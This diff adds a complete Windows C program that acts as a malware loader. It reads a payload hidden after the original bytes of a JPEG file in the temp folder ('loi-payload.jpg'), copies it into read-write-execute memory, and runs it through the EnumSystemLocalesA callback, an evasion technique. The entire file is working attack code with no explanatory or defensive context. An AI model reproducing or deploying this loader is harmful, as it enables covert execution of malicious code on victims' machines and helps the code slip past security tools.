@@ -1,0 +1,84 @@
+#include <windows.h>
+#include <stdio.h>
+#include <stdlib.h>
+
+#define TARGET_FILE_PATH "%TMP%\\loi-payload.jpg"
+#define ORIGINAL_FILE_SIZE 499661
+
+char* expand_environment_variables(const char* input) {
+    DWORD size = ExpandEnvironmentStringsA(input, NULL, 0);
+    if (size == 0) return NULL;
+
+    char* expanded = (char*)malloc(size);
+    if (!expanded) return NULL;
+
+    if (ExpandEnvironmentStringsA(input, expanded, size) == 0) {
+        free(expanded);
+        return NULL;
+    }
+
+    return expanded;
+}
+
+BOOL extract_payload(DWORD originalSize, const char* path, BYTE** payload, DWORD* size) {
+    HANDLE file = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+    if (file == INVALID_HANDLE_VALUE) return FALSE;
+
+    DWORD fileSize = GetFileSize(file, NULL);
+    if (fileSize == INVALID_FILE_SIZE || fileSize <= originalSize) {
+        CloseHandle(file);
+        return FALSE;
+    }
+
+    DWORD payloadSize = fileSize - originalSize;
+    BYTE* buffer = (BYTE*)malloc(payloadSize);
+    if (!buffer) {
+        CloseHandle(file);
+        return FALSE;
+    }
+
+    SetFilePointer(file, originalSize, NULL, FILE_BEGIN);
+    DWORD bytesRead;
+    if (!ReadFile(file, buffer, payloadSize, &bytesRead, NULL) || bytesRead != payloadSize) {
+        CloseHandle(file);
+        free(buffer);
+        return FALSE;
+    }
+
+    CloseHandle(file);
+    *payload = buffer;
+    *size = bytesRead;
+    return TRUE;
+}
+
+BOOL execute_payload_via_callback(BYTE* payload, DWORD size) {
+    void* mem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!mem) return FALSE;
+
+    memcpy(mem, payload, size);
+    EnumSystemLocalesA((LOCALE_ENUMPROCA)mem, 0);
+    return TRUE;
+}
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    BYTE* Payload = NULL;
+    DWORD PayloadSize = 0;
+
+    char* path = expand_environment_variables(TARGET_FILE_PATH);
+    if (!path) return EXIT_FAILURE;
+
+    if (!extract_payload(ORIGINAL_FILE_SIZE, path, &Payload, &PayloadSize)) {
+        free(path);
+        return EXIT_FAILURE;
+    }
+
+    if (!execute_payload_via_callback(Payload, PayloadSize)) {
+        free(path);
+        free(Payload);
+        return EXIT_FAILURE;
+    }
+
+    free(path);
+    free(Payload);
+    return EXIT_SUCCESS;
+}
